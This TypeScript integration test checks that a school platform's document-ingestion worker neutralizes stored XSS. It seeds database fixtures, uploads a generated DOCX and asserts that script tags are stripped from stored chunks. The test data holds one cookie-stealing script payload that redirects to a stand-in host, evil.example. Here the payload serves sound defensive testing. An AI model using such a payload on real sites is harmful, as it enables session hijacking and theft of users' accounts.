/**
 * Stored-XSS neutralization for ingested document content (ST-296).
 *
 * `apps/workers/src/queues/ai-ingestion/parsers` walk a DOCX/PPTX/PDF's text nodes, not markup, so a
 * payload embedded in an uploaded document arrives at `insertChunks` (worker.ts) as plain extracted
 * text — same threat shape as an announcement body, different origin. This proves the sanitizer
 * wired into that insert (worker.ts's `insertChunks`) actually runs on the full job path, not just
 * that `sanitizePlainText` is correct in isolation (see packages/sanitize/src/plain-text.test.ts for
 * that). The probe document is built ad hoc with the fixture generator's `buildDocx` rather than a
 * committed binary, since it is test data for this file, not part of the reviewable fixture corpus.
 *
 * Requires a live PostgreSQL instance, gated on TEST_DATABASE_URL like the derivation worker's DB
 * suite (apps/workers/src/queues/derivations/derivation.worker.test.ts), whose fixture-seeding
 * pattern this reuses.
 *
 *   TEST_DATABASE_URL=postgres://... bun test src/queues/ai-ingestion/worker.sanitization.test.ts
 */

// eslint-disable-next-line import-x/no-unresolved -- "bun:test" is a virtual Bun built-in with no resolvable file path
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import postgres from "postgres";

import { buildDocx } from "./__fixtures__/generate";
import { processIngestJob } from "./worker";

import type { AiIngestionWorkerConfig } from "./worker";
import type { Job } from "bullmq";
import type { Sql } from "postgres";

const DOCX_MIME_TYPE = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";

const databaseUrl = process.env.TEST_DATABASE_URL;
const describeDb = databaseUrl ? describe : describe.skip;

let sql: Sql;

beforeAll(() => {
  if (!databaseUrl) return;
  sql = postgres(databaseUrl, { max: 4, idle_timeout: 20, prepare: false });
});

afterAll(async () => {
  if (sql) await sql.end({ timeout: 5 });
});

interface MaterialFixture {
  schoolId: string;
  materialId: string;
  storageKey: string;
}

let fixtureSeq = 0;

/**
 * A school with one class and one AI-visible, `queued` material — the claimable state
 * `processIngestJob` requires. Adapted from derivation.worker.test.ts's `seedFixture`: same chain
 * (school -> user/teacher -> academic year/term/subject/course/room -> class), seeded as
 * studafy_admin because role_scope_visibility gates INSERT ... RETURNING.
 */
async function seedFixture(): Promise<MaterialFixture> {
  fixtureSeq += 1;
  const tag = `sanitize${fixtureSeq}-${Date.now().toString(36)}`;

  return await sql.begin(async (tx) => {
    await tx.unsafe("SET LOCAL ROLE studafy_admin");

    const [reference] = await tx<{ country: string; currency: string }[]>`
      SELECT
        (SELECT id FROM app.countries WHERE alpha2_code = 'US') AS country,
        (SELECT id FROM app.currencies WHERE code = 'USD') AS currency
    `;
    const schoolEmail = `${tag}@admin.local`;
    const [school] = await tx<{ id: string }[]>`
      INSERT INTO app.schools (slug, name, email, normalized_email, country_id, default_currency_id)
      VALUES (${tag}, ${`Sanitize ${tag}`}, ${schoolEmail}, ${schoolEmail},
              ${reference!.country}, ${reference!.currency})
      RETURNING id
    `;
    const schoolId = school!.id;
    await tx`SELECT set_config('app.school_id', ${schoolId}, true)`;

    const [uploader] = await tx<{ id: string }[]>`
      INSERT INTO app.users (school_id, email, normalized_email, display_name, status)
      VALUES (${schoolId}::uuid, ${`u-${tag}@t.local`}, ${`u-${tag}@t.local`}, 'Teacher', 'active')
      RETURNING id
    `;
    const uploaderUserId = uploader!.id;

    const [teacher] = await tx<{ id: string }[]>`
      INSERT INTO app.teachers (school_id, user_id, employee_number, employment_status)
      VALUES (${schoolId}::uuid, ${uploaderUserId}::uuid, ${`EMP-${tag}`}, 'active')
      RETURNING id
    `;
    const teacherId = teacher!.id;

    const [year] = await tx<{ id: string }[]>`
      INSERT INTO app.academic_years (school_id, code, name, starts_on, ends_on, status)
      VALUES (${schoolId}::uuid, ${`AY-${tag}`}, ${`AY ${tag}`}, '2026-01-01'::date, '2026-12-31'::date, 'active')
      RETURNING id
    `;
    const [term] = await tx<{ id: string }[]>`
      INSERT INTO app.terms
        (school_id, academic_year_id, code, name, sequence_number, starts_on, ends_on, status)
      VALUES (${schoolId}::uuid, ${year!.id}::uuid, ${`T-${tag}`}, ${`T ${tag}`}, 1::smallint,
              '2026-01-01'::date, '2026-06-30'::date, 'active')
      RETURNING id
    `;
    const [subject] = await tx<{ id: string }[]>`
      INSERT INTO app.subjects (school_id, code, name, status)
      VALUES (${schoolId}::uuid, ${`SUB-${tag}`}, ${`Subject ${tag}`}, 'active')
      RETURNING id
    `;
    const [course] = await tx<{ id: string }[]>`
      INSERT INTO app.courses (school_id, subject_id, code, name, credit_hours, status)
      VALUES (${schoolId}::uuid, ${subject!.id}::uuid, ${`CRS-${tag}`}, ${`Course ${tag}`}, 1, 'active')
      RETURNING id
    `;
    const [room] = await tx<{ id: string }[]>`
      INSERT INTO app.rooms (school_id, code, name, room_type, capacity, building)
      VALUES (${schoolId}::uuid, ${`RM-${tag}`}, ${`Room ${tag}`}, 'physical', 30, 'Main')
      RETURNING id
    `;
    const [cls] = await tx<{ id: string }[]>`
      INSERT INTO app.classes
        (school_id, course_id, academic_year_id, term_id, lead_teacher_id, room_id, code, capacity, status)
      VALUES (${schoolId}::uuid, ${course!.id}::uuid, ${year!.id}::uuid, ${term!.id}::uuid,
              ${teacherId}::uuid, ${room!.id}::uuid, ${`CLS-${tag}`}, 32, 'active')
      RETURNING id
    `;

    const storageKey = `permanent/${schoolId}/materials/probe-${tag}.docx`;
    const [material] = await tx<{ id: string }[]>`
      INSERT INTO app.materials
        (school_id, class_id, uploaded_by_user_id, last_edited_by_user_id, title,
         storage_key, original_file_name, mime_type, size_bytes, ai_visible, ingest_status)
      VALUES (${schoolId}::uuid, ${cls!.id}::uuid, ${uploaderUserId}::uuid, ${uploaderUserId}::uuid,
              ${`Material ${tag}`}, ${storageKey}, ${`probe-${tag}.docx`}, ${DOCX_MIME_TYPE}, 1024,
              true, 'queued'::app.material_ingest_status)
      RETURNING id
    `;

    return { schoolId, materialId: material!.id, storageKey };
  });
}

const jobFor = (f: MaterialFixture): Job =>
  ({
    id: crypto.randomUUID(),
    name: "ai-ingestion",
    data: { version: 1, materialId: f.materialId, schoolId: f.schoolId },
  }) as unknown as Job;

async function chunkContents(
  materialId: string,
): Promise<{ content: string; sectionTitle: string | null }[]> {
  const rows = await sql<{ content: string; section_title: string | null }[]>`
    SELECT content, section_title
    FROM app.material_chunks
    WHERE material_id = ${materialId}::uuid
    ORDER BY chunk_index ASC
  `;
  return rows.map((row) => ({ content: row.content, sectionTitle: row.section_title }));
}

describeDb("ai-ingestion stored-XSS neutralization", () => {
  test("a script payload embedded in an uploaded DOCX is neutralized before storage", async () => {
    const fixture = await seedFixture();
    const docxBytes = await buildDocx(
      "Chapter 3: Web Security",
      [
        "<script>document.location='https://evil.example/steal?c='+document.cookie</script>",
        "Never trust user input, even inside a document upload.",
      ],
      [],
    );

    const config: AiIngestionWorkerConfig = {
      databaseUrl: databaseUrl!,
      fetchBytes: async () => new Uint8Array(docxBytes),
    };

    const result = await processIngestJob(jobFor(fixture), config);

    expect(result).toMatchObject({ processed: true, ingested: true });
    if (!result.processed || !result.ingested) throw new Error("unreachable");
    expect(result.chunks).toBeGreaterThan(0);

    const chunks = await chunkContents(fixture.materialId);
    const allContent = chunks.map((c) => c.content).join("\n");

    expect(allContent).not.toContain("<script>");
    expect(allContent).not.toContain("</script>");
    expect(allContent).not.toMatch(/<script/i);
    expect(allContent).toContain("Never trust user input, even inside a document upload.");
    // The payload's own text is preserved, inert, not silently dropped.
    expect(allContent).toContain("document.location");
  });
});
